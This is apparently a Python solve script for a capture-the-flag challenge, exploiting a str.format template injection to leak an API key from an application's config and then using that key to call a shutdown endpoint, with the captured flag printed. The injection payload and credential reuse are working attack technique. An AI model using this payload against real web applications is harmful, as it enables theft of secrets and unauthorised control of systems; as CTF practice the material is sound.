#!/usr/bin/env python3

import requests

# MUST READ: https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/

#employee = requests.get("http://srv1.momandpopsflags.ca:45451/api/v1/employees/format".strip(), params={"template": "{person.__init__.__globals__[CONFIG][API_KEY]}"})
#print(employee.content.strip())
# We find that the API key is W8ptasW9wtjjLKQsZGZ2jkLtNzA

post = requests.post("http://srv1.momandpopsflags.ca:45451/api/v1/security-controls/shutdown", headers={"X-API-Key": "W8ptasW9wtjjLKQsZGZ2jkLtNzA"}, json={"lasers": ["laser0", "laser1", "laser2", "laser3"]})
print(post.content.strip())
# We successfully shut down the lasers and get 'You shut down 4 of 4 lasers!\n\nmagpie{ju5t_w0rm_4r0und_th3_la53r5}\n\nSorry, your IP can only shut off the laser video stream 5 times per hour.\nCooldown remaining: 00:23:53'
